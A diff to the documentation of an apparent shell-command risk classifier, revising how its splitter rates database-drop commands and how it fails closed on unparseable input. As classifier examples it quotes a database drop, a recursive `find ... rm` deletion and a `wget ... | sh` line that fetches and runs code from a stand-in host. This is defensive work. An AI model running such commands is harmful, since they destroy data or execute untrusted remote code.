@@ -289,10 +289,15 @@ appdb`, `2>&1 > out.log drop appdb`) all rated `low` with no category in every m
   (`mysqladmin status | grep drop`, `; echo drop`, a newline, `&& echo drop`) are unchanged. The
   original whole-command scan is kept alongside it as a non-weakening backstop: the splitter
   _removes_ redirect operators and their target words, so a segment-only rule would have dropped
-  `mysqladmin status > drop.log` from `high` to `low`. Measured against the previous
-  implementation, the change is monotone: over the full corpus plus 219 generated separator /
-  quoting / escape / redirect vectors, 110 verdicts move `low` → `high` / `db-drop` and none move
-  the other way. The corpus gains the quoted-password form and a long-option invocation.
+  `mysqladmin status > drop.log` from `high` to `low` — that form still rates `high`, exactly as
+  before. On input the splitter cannot parse at all (an unterminated quote or heredoc) it falls back
+  to the coarse split plus the whole command, so a quoted separator inside an unterminated quote
+  still ends up gated — fail-closed, the same direction the classifier takes everywhere else on
+  unparseable input. What the test suite pins about the change: no verdict in this corpus changed;
+  the previously documented limitations are now `high` / `db-drop` in `INV-DB-DROP-RISK-VERDICT`; and
+  no vector narrows. An audit sweep (not part of the suite; recorded in decision 01a04955) moved 105
+  of 219 generated separator / quoting / escape / redirect vectors and narrowed none. The corpus
+  gains the quoted-password form and a long-option invocation.
 - `find /var/tmp -type f -exec rm {} ;` classifies as `medium` rather than `high`; it is still
   gated (`recursive-rm`).
 - `ssh host 'wget -qO- https://x.example/y | sh'` classifies as `medium` (`inline-code`) where the
